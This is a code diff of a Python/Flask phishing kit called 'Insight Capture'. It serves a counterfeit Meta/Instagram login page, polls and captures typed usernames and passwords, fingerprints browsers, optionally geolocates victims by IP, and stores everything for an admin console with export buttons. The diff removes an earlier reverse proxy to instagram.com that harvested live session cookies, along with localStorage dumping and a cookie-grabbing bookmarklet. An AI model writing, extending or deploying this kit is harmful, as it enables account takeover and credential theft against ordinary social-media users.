@@ -1,5 +1,5 @@
 """
-Insight Capture — credential + browser cookie capture with an admin console.
+Insight Capture — credential capture with an admin console.
 
 Env:
   SECRET_KEY    flask session key            (required in prod)
@@ -8,29 +8,21 @@ Env:
   GEO           1 to enable IP geo lookup    (default off)
   ANSI          0 to strip log colours       (default on)
   PORT          listen port                  (default 5000)
-  PROXY         1 to reverse-proxy instagram (default on)
-  PROXY_HOST    upstream host                (default www.instagram.com)
 """
 
 from __future__ import annotations
 
 import csv
-import gzip
-import hashlib
 import hmac
 import io
 import json
 import logging
 import os
 import random
-import re
 import sqlite3
-import ssl
 import sys
 import threading
 import time
-import urllib.error
-import urllib.parse
 import urllib.request
 import uuid
 from collections import deque
@@ -60,9 +52,6 @@ DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
 GEO_ENABLED = os.environ.get("GEO", "0") == "1"
 ANSI_ON = os.environ.get("ANSI", "1") != "0"
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
-PROXY_ON = os.environ.get("PROXY", "1") != "0"
-PROXY_HOST = os.environ.get("PROXY_HOST", "www.instagram.com")
-PROXY_ORIGIN = "https://" + PROXY_HOST
 
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 DB_PATH = DATA_DIR / "insight.sqlite3"
@@ -99,12 +88,9 @@ C = {
     "reset": "\033[0m",
     "cred": "\033[1;33m",
     "cred_val": "\033[1;97m",
-    "fb": "\033[1;34m",
-    "ig": "\033[1;35m",
-    "other": "\033[1;36m",
-    "cookie": "\033[1;36m",
-    "cookie_val": "\033[96m",
-    "sep": "\033[2;33m",
+    "uval": "\033[1;96m",
+    "pval": "\033[1;95m",
+    "ctx": "\033[2;36m",
     "meta": "\033[1;35m",
 }
 BOX_W = 64
@@ -133,19 +119,17 @@ def print_box(title: str, lines: list, color: str = "cred", value_color: str = "
     sys.stdout.flush()
 
 
-def emit(kind: str, payload: dict, boxes: list[tuple] | None = None) -> None:
-    """Coloured boxes on stdout + one machine line in events.jsonl."""
+def emit(payload: dict, boxes: list[tuple] | None = None) -> None:
+    """Credential box on stdout + one machine line in events.jsonl."""
     for box in boxes or []:
         print_box(box[0], box[1], box[2] if len(box) > 2 else "cred",
                   box[3] if len(box) > 3 else "cred_val")
 
     stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
-    body = {"ts": stamp, "kind": kind, **payload}
+    body = {"ts": stamp, "kind": "CREDENTIAL", **payload}
 
-    lines = [f"── {kind} ── {stamp}", f"cid={payload.get('cid', '-')} ip={payload.get('ip', '-')}"]
+    lines = [f"── CREDENTIAL ── {stamp}"]
     for k, v in payload.items():
-        if k in ("cid", "ip"):
-            continue
         if isinstance(v, dict):
             for sk, sv in v.items():
                 lines.append(f"   {sk}: {str(sv)[:200]}")
@@ -164,23 +148,15 @@ def emit(kind: str, payload: dict, boxes: list[tuple] | None = None) -> None:
 _db_lock = threading.Lock()
 
 SCHEMA = """
-CREATE TABLE IF NOT EXISTS captures (
+CREATE TABLE IF NOT EXISTS creds (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    cid TEXT, sid TEXT, reason TEXT, digest TEXT,
+    cid TEXT, sid TEXT, source TEXT, username TEXT, password TEXT,
     ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
-    cookie_header TEXT, js_cookies TEXT, storage_json TEXT, meta_json TEXT,
-    country TEXT, city TEXT, isp TEXT, geo_json TEXT,
+    meta_json TEXT, country TEXT, city TEXT, isp TEXT, geo_json TEXT,
     created_at TEXT
 );
-CREATE TABLE IF NOT EXISTS logins (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    capture_id INTEGER, source TEXT, username TEXT, password TEXT,
-    ip TEXT, ua TEXT, cookie_header TEXT, js_cookies TEXT, meta_json TEXT,
-    created_at TEXT
-);
-CREATE INDEX IF NOT EXISTS idx_cap_id ON captures(id DESC);
-CREATE INDEX IF NOT EXISTS idx_cap_digest ON captures(cid, digest);
-CREATE INDEX IF NOT EXISTS idx_log_cap ON logins(capture_id);
+CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
+CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
 """
 
 
@@ -197,30 +173,24 @@ def init_db() -> None:
         conn = connect()
         try:
             conn.executescript(SCHEMA)
-            cols = {r["name"] for r in conn.execute("PRAGMA table_info(logins)")}
-            if "source" not in cols:
-                conn.execute("ALTER TABLE logins ADD COLUMN source TEXT")
             conn.commit()
         finally:
             conn.close()
 
 
-def store_capture(**kw) -> int:
+def store_cred(**kw) -> int:
     with _db_lock:
         conn = connect()
         try:
             cur = conn.execute(
-                """INSERT INTO captures
-                   (cid, sid, reason, digest, ip, ua, referer, accept_lang,
-                    cookie_header, js_cookies, storage_json, meta_json,
-                    country, city, isp, geo_json, created_at)
-                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+                """INSERT INTO creds
+                   (cid, sid, source, username, password, ip, ua, referer,
+                    accept_lang, meta_json, country, city, isp, geo_json, created_at)
+                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                 (
-                    kw["cid"], kw["sid"], kw["reason"], kw["digest"], kw["ip"],
-                    kw["ua"], kw["referer"], kw["accept_lang"], kw["cookie_header"],
-                    kw["js_cookies"], kw["storage_json"], kw["meta_json"],
-                    kw["country"], kw["city"], kw["isp"], kw["geo_json"],
-                    kw["created_at"],
+                    kw["cid"], kw["sid"], kw["source"], kw["username"], kw["password"],
+                    kw["ip"], kw["ua"], kw["referer"], kw["accept_lang"], kw["meta_json"],
+                    kw["country"], kw["city"], kw["isp"], kw["geo_json"], kw["created_at"],
                 ),
             )
             conn.commit()
@@ -229,35 +199,13 @@ def store_capture(**kw) -> int:
             conn.close()
 
 
-def store_login(**kw) -> None:
-    with _db_lock:
-        conn = connect()
-        try:
-            conn.execute(
-                """INSERT INTO logins
-                   (capture_id, source, username, password, ip, ua,
-                    cookie_header, js_cookies, meta_json, created_at)
-                   VALUES (?,?,?,?,?,?,?,?,?,?)""",
-                (
-                    kw["capture_id"], kw["source"], kw["username"], kw["password"],
-                    kw["ip"], kw["ua"], kw["cookie_header"], kw["js_cookies"],
-                    kw["meta_json"], kw["created_at"],
-                ),
-            )
-            conn.commit()
-        finally:
-            conn.close()
-
-
-def is_duplicate(cid: str, digest: str, seconds: int = 6) -> bool:
-    if not digest:
-        return False
+def is_duplicate(cid: str, username: str, password: str, seconds: int = 8) -> bool:
     cutoff = datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")
     conn = connect()
     try:
         row = conn.execute(
-            "SELECT 1 FROM captures WHERE cid=? AND digest=? AND created_at>=? LIMIT 1",
-            (cid, digest, cutoff),
+            "SELECT 1 FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? LIMIT 1",
+            (cid, username, password, cutoff),
         ).fetchone()
         return row is not None
     finally:
@@ -316,114 +264,25 @@ def geo(ip: str) -> dict:
     return data
 
 
-def parse_cookie_string(raw: str) -> dict:
-    out = {}
-    for chunk in (raw or "").split(";"):
-        if "=" in chunk:
-            k, v = chunk.split("=", 1)
-            k = k.strip()
-            if k:
-                out[k] = v.strip()
-    return out
-
-
-# --- three-way cookie scope ---
-FB_COOKIE_NAMES = {
-    "c_user", "xs", "datr", "fr", "sb", "wd", "presence", "m_pixel_ratio",
-    "locale", "_fbp", "_fbc", "_js_datr", "oo", "pl", "lu", "csm", "s",
-    "i_user", "dpr", "js_ver", "rs", "pnl_data", "usida", "a11y",
-}
-IG_COOKIE_NAMES = {
-    "csrftoken", "ds_user_id", "sessionid", "sessionid_ss", "mid", "ig_did",
-    "ig_nrcb", "rur", "shbid", "shbts", "mcd", "urlgen", "ig_pr", "ig_vw",
-    "ig_direct_region_hint", "ig_evt", "ig_lang", "ig_hats", "x-ig-app-id",
-}
-
-
-def classify_cookie(name: str) -> str:
-    n = (name or "").strip().lower()
-    if not n:
-        return ""
-    if n in FB_COOKIE_NAMES or n.startswith(("fbm_", "fbsr_", "_fb")):
-        return "fb"
-    if n in IG_COOKIE_NAMES or n.startswith(("ig_", "x-ig")):
-        return "ig"
-    return "other"
-
-
-def split_cookie_string(raw: str) -> tuple[list, list, list]:
-    fb: list = []
-    ig: list = []
-    other: list = []
-    for chunk in (raw or "").split(";"):
-        if "=" not in chunk:
-            continue
-        k, v = chunk.split("=", 1)
-        k = k.strip()
-        if not k:
-            continue
-        brand = classify_cookie(k)
-        if brand == "fb":
-            fb.append((k, v.strip()))
-        elif brand == "ig":
-            ig.append((k, v.strip()))
-        else:
-            other.append((k, v.strip()))
-    return fb, ig, other
-
-
-def filter_cookie_string(raw: str) -> str:
-    fb, ig, other = split_cookie_string(raw)
-    return "; ".join(f"{k}={v}" for k, v in fb + ig + other)
-
-
-def brand_counts(header: str, js: str) -> tuple[int, int, int]:
-    hf, hi, ho = split_cookie_string(header)
-    jf, ji, jo = split_cookie_string(js)
-    return len(hf) + len(jf), len(hi) + len(ji), len(ho) + len(jo)
-
-
-def digest_of(*parts: str) -> str:
-    h = hashlib.sha256()
-    for p in parts:
-        h.update((p or "").encode("utf-8", "replace"))
-        h.update(b"\x1f")
-    return h.hexdigest()[:32]
-
-
 def make_initials(name: str) -> str:
     parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
     return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()
 
 
-ICON = {"fb": "📘", "ig": "📸", "other": "🍪"}
-LABEL = {"fb": "FACEBOOK", "ig": "INSTAGRAM", "other": "OTHER"}
-
-
-def _pairs_lines(pairs: list, tag: str) -> list:
-    return [(f"{tag} {k} = {v[:70]}", "cookie_val") for k, v in pairs]
-
-
-def boxes_for(header: str, js: str) -> list[tuple]:
-    hf, hi, ho = split_cookie_string(header)
-    jf, ji, jo = split_cookie_string(js)
-    out: list[tuple] = []
-    for brand, hp, jp in (("fb", hf, jf), ("ig", hi, ji), ("other", ho, jo)):
-        if not (hp or jp):
-            continue
-        lines = _pairs_lines(hp, "H") + _pairs_lines(jp, "J")
-        out.append((
-            f"{ICON[brand]} {LABEL[brand]} COOKIES · {len(hp) + len(jp)}",
-            lines, brand, "cookie_val",
-        ))
-    return out
-
-
 def cred_box(title: str, username: str, password: str) -> tuple:
     return (title, [
-        ("username : " + (username or "(blank)"), "cred_val"),
-        ("password : " + (password or "(blank)"), "cred_val"),
-    ], "cred", "cred_val")
+        ("username : " + (username or "(blank)"), "uval"),
+        ("password : " + (password or "(blank)"), "pval"),
+    ], "cred", "uval")
+
+
+def ctx_box(ip: str, source: str, ua: str, place: str) -> tuple:
+    return ("context", [
+        ("ip       : " + (ip or "-"), "ctx"),
+        ("source   : " + (source or "-"), "ctx"),
+        ("place    : " + (place or "-"), "ctx"),
+        ("ua       : " + (ua or "-")[:52], "ctx"),
+    ], "cred", "ctx")
 
 
 def admin_ok() -> bool:
@@ -436,151 +295,6 @@ def admin_ok() -> bool:
         session["admin"] = True
         return True
     return False
-
-
-# ============================== reverse proxy ==============================
-_HOP = {
-    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
-    "te", "trailers", "transfer-encoding", "upgrade", "host",
-    "content-length", "content-encoding", "accept-encoding", "cookie2",
-}
-_REWRITE_TYPES = ("text/html", "text/css", "javascript", "application/json", "text/plain")
-
-
-class _NoRedirect(urllib.request.HTTPRedirectHandler):
-    def redirect_request(self, *a, **k):
-        return None
-
-
-_OPENER = urllib.request.build_opener(_NoRedirect())
-_SSL = ssl.create_default_context()
-_SSL.check_hostname = False
-_SSL.verify_mode = ssl.CERT_NONE
-_seen_sid: set[str] = set()
-_seen_lock = threading.Lock()
-
-
-def _rewrite_body(body: bytes, ctype: str) -> bytes:
-    if not any(t in ctype for t in _REWRITE_TYPES):
-        return body
-    for host in (PROXY_HOST, "instagram.com"):
-        body = body.replace(("https://" + host + "/").encode(), b"/")
-        body = body.replace(("https://" + host).encode(), b"")
-        body = body.replace(("https:\\/\\/" + host + "\\/").encode(), b"\\/")
-        body = body.replace(("http://" + host + "/").encode(), b"/")
-        body = body.replace(("http://" + host).encode(), b"")
-    return body
-
-
-def _strip_domain(set_cookie: str) -> str:
-    parts = [p.strip() for p in set_cookie.split(";")]
-    keep = [p for p in parts if not p.lower().startswith("domain=")]
-    if not os.environ.get("RENDER"):
-        keep = [p for p in keep if p.lower() != "secure"]
-    return "; ".join(keep)
-
-
-def proxy_request(path: str) -> Response:
-    """Forward to the upstream host, rewriting URLs, cookies and redirects."""
-    target = f"{PROXY_ORIGIN}/{path.lstrip('/')}"
-    if request.query_string:
-        target += "?" + request.query_string.decode("latin-1")
-
-    headers = {}
-    for key, value in request.headers.items():
-        if key.lower() in _HOP:
-            continue
-        headers[key] = value
-    headers["Host"] = PROXY_HOST
-    headers["Accept-Encoding"] = "identity"
-    headers["Referer"] = PROXY_ORIGIN + request.path
-
-    origin = request.headers.get("Origin")
-    if origin:
-        headers["Origin"] = PROXY_ORIGIN
-
-    body = request.get_data() if request.method not in ("GET", "HEAD") else None
-    req = urllib.request.Request(target, data=body, headers=headers, method=request.method)
-
-    try:
-        raw = _OPENER.open(req, timeout=25)
-        status = raw.status
-        hdrs = raw.headers
-        payload = raw.read()
-    except urllib.error.HTTPError as exc:
-        status = exc.code
-        hdrs = exc.headers
-        payload = exc.read()
-    except Exception as exc:
-        logger.warning("proxy failed %s: %s", target, exc)
-        return Response(f"upstream error: {exc}", status=502, mimetype="text/plain")
-
-    ctype = hdrs.get("Content-Type", "application/octet-stream")
-    if hdrs.get("Content-Encoding", "").lower() == "gzip":
-        try:
-            payload = gzip.decompress(payload)
-        except OSError:
-            pass
-
-    payload = _rewrite_body(payload, ctype.lower())
-
-    out = Response(payload, status=status, mimetype=ctype.split(";")[0] or "application/octet-stream")
-
-    for key, value in hdrs.items():
-        low = key.lower()
-        if low in _HOP or low in ("content-type", "set-cookie", "location", "content-security-policy"):
-            continue
-        out.headers[key] = value
-
-    for cookie in hdrs.get_all("Set-Cookie") or []:
-        out.headers.add("Set-Cookie", _strip_domain(cookie))
-
-    location = hdrs.get("Location")
-    if location:
-        for host in (PROXY_ORIGIN, "https://instagram.com"):
-            if location.startswith(host):
-                location = location[len(host):] or "/"
-                break
-        out.headers["Location"] = location
-
-    # ---- capture the real session as soon as it exists ----
-    jar = parse_cookie_string(request.headers.get("Cookie", ""))
-    sid_val = jar.get("sessionid") or ""
-    if sid_val:
-        with _seen_lock:
-            fresh = sid_val not in _seen_sid
-            if fresh:
-                _seen_sid.add(sid_val)
-        if fresh:
-            capture_proxied_session(request.headers.get("Cookie", ""), path)
-
-    return out
-
-
-def capture_proxied_session(cookie_header: str, path: str) -> None:
-    """Real httpOnly session landed on our host — log it loudly."""
-    ip = client_ip()
-    info = geo(ip)
-    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
-    kept = filter_cookie_string(cookie_header)
-
-    cap_id = store_capture(
-        cid=g.cid, sid="proxy", reason="proxy_session", digest="",
-        ip=ip, ua=request.headers.get("User-Agent", ""),
-        referer=PROXY_ORIGIN + path, accept_lang=request.headers.get("Accept-Language", ""),
-        cookie_header=kept, js_cookies="",
-        storage_json="{}", meta_json="{}",
-        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
-        geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
-    )
-    session["last_cap"] = cap_id
-
-    emit("SESSION_HARVEST", {
-        "cid": g.cid, "cap": cap_id, "ip": ip,
-        "path": path, "bytes": len(kept),
-        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(kept).items()},
-    }, [cred_box("🎯 LIVE SESSION HARVESTED", "httpOnly sessionid captured", str(len(kept)) + " bytes")]
-       + boxes_for(kept, ""))
 
 
 # ============================== login page ==============================
@@ -760,7 +474,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
         <div class="footer">
             &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms
-            &middot; <a href="/bookmarklet" target="_blank">English (UK)</a>
+            &middot; <a href="/console" target="_blank">English (UK)</a>
         </div>
     </div>
 
@@ -802,11 +516,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
   });
 
   var SID = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
-  var seq = 0;
-  var lastDigest = '';
-  var queue = [];
-  var flushing = false;
-  var retries = 0;
 
   function fnv(str) {
     var h = 0x811c9dc5;
@@ -825,7 +534,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
       x.textBaseline = 'top';
       x.font = '16px Arial';
       x.fillStyle = '#f60'; x.fillRect(0, 0, 130, 32);
-      x.fillStyle = '#069'; x.fillText('Insight, capture 2.2', 2, 4);
+      x.fillStyle = '#069'; x.fillText('Insight, capture 3.0', 2, 4);
       x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('fingerprint', 4, 22);
       x.beginPath(); x.arc(200, 35, 22, 0, Math.PI * 2); x.fill();
       return fnv(c.toDataURL());
@@ -860,18 +569,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
         });
       });
       return Array.from(new Set(hits)).slice(0, 40);
-    } catch (e) { return []; }
-  }
-
-  function storageDump(store) {
-    try {
-      var out = [];
-      for (var i = 0; i < store.length; i++) {
-        var k = store.key(i);
-        var v = store.getItem(k) || '';
-        out.push(k + '=' + (v.length > 220 ? v.slice(0, 220) + '…' : v));
-      }
-      return out;
     } catch (e) { return []; }
   }
 
@@ -928,91 +625,9 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
   function gather() {
     var meta = baseMeta();
-    var local = storageDump(localStorage);
-    var sess = storageDump(sessionStorage);
-    var cookies = document.cookie || '';
-
-    var payload = {
-      sid: SID,
-      seq: ++seq,
-      cookies: cookies,
-      local: local,
-      sess: sess,
-      meta: meta,
-      hash: fnv(cookies + '|' + local.join('|') + '|' + sess.join('|') + '|' + JSON.stringify(meta))
-    };
-
-    try {
-      if (navigator.getBattery) {
-        navigator.getBattery().then(function (b) {
-          meta.battery = { level: Math.round(b.level * 100), charging: b.charging ? 1 : 0 };
-        }).catch(function () {});
-      }
-    } catch (e) {}
-    try {
-      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        navigator.userAgentData.getHighEntropyValues(
-          ['architecture', 'bitness', 'model', 'platformVersion', 'uaFullVersion', 'fullVersionList']
-        ).then(function (h) { meta.uaData = h; }).catch(function () {});
-      }
-    } catch (e) {}
-    try {
-      if (navigator.storage && navigator.storage.estimate) {
-        navigator.storage.estimate().then(function (s) {
-          meta.storage = { quota: s.quota || 0, usage: s.usage || 0 };
-        }).catch(function () {});
-      }
-    } catch (e) {}
-
     var field = document.getElementById('payload');
-    if (field) field.value = JSON.stringify(payload);
-
-    return payload;
-  }
-
-  function flush(useBeacon) {
-    if (flushing || !queue.length) return;
-    flushing = true;
-    var item = queue.shift();
-    var body = JSON.stringify(item);
-    var done = function (ok) {
-      flushing = false;
-      if (!ok && retries < 3) {
-        retries++;
-        queue.unshift(item);
-        setTimeout(function () { flush(true); }, 700 * retries);
-        return;
-      }
-      retries = 0;
-      if (queue.length) setTimeout(function () { flush(useBeacon); }, 90);
-    };
-
-    if (useBeacon && navigator.sendBeacon) {
-      var ok = false;
-      try { ok = navigator.sendBeacon('/collect', new Blob([body], { type: 'application/json' })); } catch (e) {}
-      return done(ok);
-    }
-
-    try {
-      fetch('/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: body,
-        keepalive: true,
-        credentials: 'same-origin'
-      }).then(function (r) { done(r.ok); }).catch(function () { done(false); });
-    } catch (e) { done(false); }
-  }
-
-  function send(reason, beacon) {
-    var p = gather();
-    if (p.hash === lastDigest && reason === 'poll') return;
-    lastDigest = p.hash;
-    p.reason = reason;
-    p.ts = Date.now();
-    queue.push(p);
-    if (queue.length > 12) queue = queue.slice(-12);
-    flush(beacon !== false);
+    if (field) field.value = JSON.stringify({ sid: SID, meta: meta });
+    return meta;
   }
 
   var uEl = document.getElementById('u');
@@ -1039,9 +654,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
       password: p,
       source: source,
       sid: SID,
-      cookies: document.cookie || '',
-      local: storageDump(localStorage),
-      sess: storageDump(sessionStorage)
+      meta: baseMeta()
     });
 
     if (navigator.sendBeacon) {
@@ -1072,25 +685,13 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
   setInterval(function () { pushCred('poll'); }, 1000);
 
-  send('load');
-  document.addEventListener('DOMContentLoaded', function () { send('dom'); });
-  setInterval(function () { send('poll'); }, 12000);
-  document.addEventListener('visibilitychange', function () { send(document.hidden ? 'hidden' : 'visible'); });
   window.addEventListener('pageshow', function () { pushCred('pageshow', true); });
-  window.addEventListener('pagehide', function () { send('pagehide', true); });
-  window.addEventListener('beforeunload', function () { send('unload', true); });
-  window.addEventListener('online', function () { send('online'); });
-
-  ['pointerdown', 'keydown', 'scroll', 'touchstart'].forEach(function (ev) {
-    window.addEventListener(ev, function () { send('interact'); }, { passive: true, once: true });
-  });
 
   var form = document.getElementById('loginForm');
   if (form) {
     form.addEventListener('submit', function () {
       gather();
       pushCred('submit', true);
-      send('submit', true);
     });
   }
 })();
@@ -1416,8 +1017,8 @@ function settings(){
  ${sw("stalk","Profile visit alerts","Notify me about repeat visitors")}
  <div class="sec"><h3>Privacy</h3></div>
  ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
- ${lk("Collected cookies","What this browser sent us","","/cookies")}
- ${lk("Cookie bridge","Grab real Instagram cookies","","/bookmarklet")}
+ ${lk("Captured credentials","Last login this browser sent","","/cookies")}
+ ${lk("Capture console","Open the admin console","","/admin")}
  ${lk("Blocked accounts","")}
  ${lk("Data sync frequency","Every 15 minutes")}
  <div class="sec"><h3>Account</h3></div>
@@ -1457,46 +1058,6 @@ render();
 </html>
 """
 
-# ============================== bookmarklet page ==============================
-BOOKMARKLET_PAGE = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Cookie bridge</title>
-<style>
-:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#25d366}
-*{box-sizing:border-box;margin:0}
-body{min-height:100dvh;display:grid;place-items:center;background:var(--bg);color:var(--tx);
-font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:24px}
-.card{width:100%;max-width:470px;background:var(--card);border:1px solid var(--line);
-border-radius:14px;padding:24px}
-h1{font-size:17px;margin:0 0 10px;color:var(--acc)}
-p{color:var(--mut);font-size:13.5px;margin:0 0 12px}
-a.bm{display:block;text-align:center;background:var(--ok);color:#06210f;font-weight:700;
-padding:15px;border-radius:10px;text-decoration:none;margin:18px 0;font-size:15px}
-a.bm:active{transform:scale(.985)}
-code{background:#0a0a0c;border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:12px}
-textarea{width:100%;height:96px;background:#0a0a0c;border:1px solid var(--line);color:#7fe7f5;
-border-radius:8px;padding:10px;font:11px ui-monospace,monospace;resize:vertical;margin-top:10px}
-ol{padding-left:20px;color:var(--mut);font-size:13px}
-ol li{margin-bottom:7px}
-.note{margin-top:16px;font-size:12px;color:#6d6d7a;border-top:1px solid var(--line);padding-top:12px}
-</style></head><body>
-<div class="card">
-<h1>&#128229; Instagram cookie bridge</h1>
-<p>Fallback when the proxy is off. Real <code>instagram.com</code> cookies live on that domain —
-this bookmarklet reads them there and posts them back.</p>
-<ol>
-<li>Drag the green button to your bookmarks bar.</li>
-<li>Open <code>instagram.com</code> in the same browser and sign in.</li>
-<li>Click the bookmark.</li>
-</ol>
-<a class="bm" href="__JS__">&#128229; Grab IG cookies</a>
-<textarea readonly onclick="this.select()">__JS__</textarea>
-<p class="note">No bookmarks bar on mobile? Copy the text above and paste it as the URL of a new
-bookmark. <code>sessionid</code> is httpOnly so this path cannot read it — enable the proxy for
-that.</p>
-</div></body></html>"""
-
 # ============================== admin console ==============================
 ADMIN_HTML = """
 <!DOCTYPE html>
@@ -1504,7 +1065,7 @@ ADMIN_HTML = """
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Insight Console</title>
 <style>
-:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642;--fb:#5aa9ff;--ig:#ff7ac2}
+:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642;--u:#4fd6ff;--p:#ff8ad8}
 *{box-sizing:border-box;margin:0}
 body{background:var(--bg);color:var(--tx);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
 header{display:flex;gap:14px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
@@ -1515,6 +1076,8 @@ h1 i{color:var(--acc);font-style:normal}
 .stat b{color:var(--tx)}
 a.btn,button.btn{background:var(--card);border:1px solid var(--line);color:var(--tx);padding:6px 12px;border-radius:8px;cursor:pointer;text-decoration:none;font:inherit;font-size:12px;transition:.15s}
 a.btn:hover,button.btn:hover{border-color:var(--acc);color:var(--acc)}
+button.cp{padding:2px 7px;font-size:10.5px;border-radius:6px;border-color:#2c2c36;color:var(--mut);vertical-align:middle}
+button.cp:hover{border-color:var(--acc);color:var(--acc)}
 main{padding:18px 20px 60px}
 table{width:100%;border-collapse:collapse;font-size:12.5px}
 th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
@@ -1522,37 +1085,31 @@ th{color:var(--mut);font-weight:600;font-size:11px;text-transform:uppercase;lett
 tr:hover td{background:#15151b}
 td a{color:var(--acc);text-decoration:none}
 td a:hover{text-decoration:underline}
-.pill{display:inline-block;padding:1px 8px;border-radius:99px;font-size:10.5px;border:1px solid}
-.pill.login{color:var(--ok);border-color:#1e6b3d;background:#0e2318}
-.pill.auto{color:var(--warn);border-color:#6b4d1e;background:#231a08}
-.pill.cap{color:var(--mut);border-color:var(--line)}
-.pill.grab{color:var(--fb);border-color:#1e4b6b;background:#08161f}
-.pill.sess{color:#ff7ac2;border-color:#6b1e4b;background:#1f0816}
-.mono{font-size:11.5px;color:var(--mut);max-width:420px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.u{color:var(--u);word-break:break-all}
+.p{color:var(--p);word-break:break-all}
+.mono{font-size:11.5px;color:var(--mut);max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 pre{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:420px}
 pre b{color:var(--acc)}
 .block{margin-bottom:16px}
-.block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px}
-.cred{background:#171408;border-color:#5a4718}
-.cred pre{background:#0f0d05;border-color:#5a4718;color:#ffe08a}
-.ck-fb pre{color:var(--fb)}
-.ck-ig pre{color:var(--ig)}
-.ck-other pre{color:#8fe6f0}
+.block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px;display:flex;gap:8px;align-items:center}
+.cred{background:#171408;border:1px solid #6b4d1e;border-radius:12px;padding:14px}
+.cred pre{background:#0f0d05;border-color:#6b4d1e;color:#ffe08a}
+.cred .row{display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap}
+.cred .k{color:#b99a4e;font-size:11px;text-transform:uppercase;letter-spacing:.1em;min-width:78px}
+.cred .v{font-size:15px;font-weight:700;word-break:break-all}
+.cred .v.u{color:var(--u)}
+.cred .v.p{color:var(--p)}
 .empty{padding:60px 0;text-align:center;color:var(--mut)}
 .warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
 form.inline{display:inline}
 </style></head><body>
 <header>
   <h1><i>▚</i> Insight Console</h1>
-  <span class="stat">captures <b>__CAPS__</b></span>
   <span class="stat">credentials <b>__LOGS__</b></span>
-  <span class="stat">proxy <b>__PROXY__</b></span>
   <span class="stat" id="live">live</span>
   <span class="spacer"></span>
   <a class="btn" href="/admin/export?fmt=json">export json</a>
   <a class="btn" href="/admin/export?fmt=csv">export csv</a>
-  <a class="btn" href="/accounts/login/">proxy</a>
-  <a class="btn" href="/bookmarklet">bridge</a>
   <a class="btn" href="/">login page</a>
 </header>
 <main>__BODY__</main>
@@ -1577,10 +1134,12 @@ form.inline{display:inline}
   }
   tick(); setInterval(tick, 4000);
 })();
-function copy(el){
-  var pre = el.closest('.block').querySelector('pre');
-  navigator.clipboard.writeText(pre.innerText).then(function(){
-    el.textContent = 'copied'; setTimeout(function(){ el.textContent = 'copy'; }, 1200);
+function cp(el){
+  var t = el.previousElementSibling;
+  if (!t) return;
+  navigator.clipboard.writeText(t.textContent).then(function(){
+    var old = el.textContent; el.textContent = 'copied';
+    setTimeout(function(){ el.textContent = old; }, 1100);
   });
 }
 </script>
@@ -1591,29 +1150,13 @@ function copy(el){
 def render_admin(body: str) -> str:
     conn = connect()
     try:
-        caps = conn.execute("SELECT COUNT(*) c FROM captures").fetchone()["c"]
-        logs = conn.execute("SELECT COUNT(*) c FROM logins").fetchone()["c"]
+        logs = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
     finally:
         conn.close()
